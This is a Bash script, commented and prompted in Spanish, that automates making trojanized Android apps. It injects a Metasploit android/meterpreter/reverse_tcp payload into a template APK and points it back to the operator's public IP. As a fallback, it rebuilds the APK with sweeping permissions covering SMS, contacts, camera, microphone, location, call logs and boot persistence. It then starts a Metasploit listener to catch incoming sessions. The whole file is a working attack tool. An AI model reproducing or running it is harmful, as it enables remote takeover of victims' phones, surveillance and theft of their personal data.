#!/bin/bash

# Verifica dependencias y permisos de superusuario
for cmd in msfvenom apktool curl; do
    if ! command -v $cmd &>/dev/null; then
        echo "$cmd no está instalado"
        exit 1
    fi
done

if [[ $EUID -ne 0 ]]; then
    echo "Este script debe ejecutarse como root"
    exit 1
fi

# Configuración de rutas y variables
OUTPUT_DIR="payloads"
mkdir -p $OUTPUT_DIR

TEMPLATE_APK="template-app.apk"
DIR_APP="extracted_app"
PERMISSIONS=(
    "android.permission.INTERNET"
    "android.permission.ACCESS_WIFI_STATE"
    "android.permission.CHANGE_WIFI_STATE"
    "android.permission.ACCESS_NETWORK_STATE"
    "android.permission.ACCESS_COARSE_LOCATION"
    "android.permission.ACCESS_FINE_LOCATION"
    "android.permission.READ_PHONE_STATE"
    "android.permission.SEND_SMS"
    "android.permission.RECEIVE_SMS"
    "android.permission.RECORD_AUDIO"
    "android.permission.CALL_PHONE"
    "android.permission.READ_CONTACTS"
    "android.permission.WRITE_CONTACTS"
    "android.permission.WRITE_SETTINGS"
    "android.permission.CAMERA"
    "android.permission.READ_SMS"
    "android.permission.WRITE_EXTERNAL_STORAGE"
    "android.permission.RECEIVE_BOOT_COMPLETED"
    "android.permission.SET_WALLPAPER"
    "android.permission.READ_CALL_LOG"
    "android.permission.WRITE_CALL_LOG"
    "android.permission.WAKE_LOCK"
    "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"
)

# Funciones
get_ips() {
    REMOTE_IP=$(curl -s ifconfig.io)
    LOCAL_IP=$(hostname -I | awk '{print $1}')
    echo "IP remota (pública): $REMOTE_IP"
    echo "IP local: $LOCAL_IP"
}

add_permissions() {
    local manifest="$DIR_APP/AndroidManifest.xml"
    for perm in "${PERMISSIONS[@]}"; do
        if ! grep -q "$perm" "$manifest"; then
            echo "Agregando permiso: $perm"
            sed -i "/<\/application>/i \    <uses-permission android:name=\"$perm\"/>" "$manifest"
        fi
    done
}

generate_payload() {
    get_ips

    read -p "Introduce el puerto (LPORT): " LPORT
    if ! [[ $LPORT =~ ^[0-9]+$ ]]; then
        echo "El puerto debe ser un número"
        return 1
    fi

    read -p "Introduce el nombre del APK de salida (sin extensión): " APK_NAME
    if [ -z "$APK_NAME" ]; then
        echo "El nombre del APK no puede estar vacío"
        return 1
    fi

    msfvenom -x $TEMPLATE_APK -p android/meterpreter/reverse_tcp LHOST=$REMOTE_IP LPORT=$LPORT -o $OUTPUT_DIR/$APK_NAME.apk

    if [[ $? -eq 0 ]]; then
        echo "Payload generado exitosamente: $OUTPUT_DIR/$APK_NAME.apk"
    else
        echo "Falló la generación con msfvenom. Procediendo con apktool..."
        apktool d -f $TEMPLATE_APK -o $DIR_APP

        if [[ $? -eq 0 ]]; then
            echo "APK descompilado en: $DIR_APP"
            add_permissions
            apktool b $DIR_APP -o $OUTPUT_DIR/$APK_NAME.apk

            if [[ $? -eq 0 ]]; then
                echo "APK recompilado con éxito: $OUTPUT_DIR/$APK_NAME.apk"
            else
                echo "Error al recompilar el APK."
            fi
        else
            echo "Error al descompilar el APK base."
        fi
    fi
}

setup_listener() {
    read -p "Introduce el puerto configurado (LPORT): " LPORT
    if ! [[ $LPORT =~ ^[0-9]+$ ]]; then
        echo "El puerto debe ser un número"
        return 1
    fi

    echo "Configurando el listener en Metasploit..."
    msfconsole -q -x "
use exploit/multi/handler;
set payload android/meterpreter/reverse_tcp;
set LHOST 0.0.0.0;
set LPORT $LPORT;
set ExitOnSession false;
exploit -j -z;"
}

show_menu() {
    echo "===== Automatización de msfvenom ====="
    echo "1. Generar APK con payload reverse_tcp"
    echo "2. Configurar listener en Metasploit"
    echo "3. Salir"
    echo -n "Selecciona una opción: "
}

# Menú principal
while true; do
    show_menu
    read OPTION
    case $OPTION in
        1) generate_payload ;;
        2) setup_listener ;;
        3) echo "Saliendo..."; exit 0 ;;
        *) echo "Opción inválida. Intenta nuevamente." ;;
    esac
done
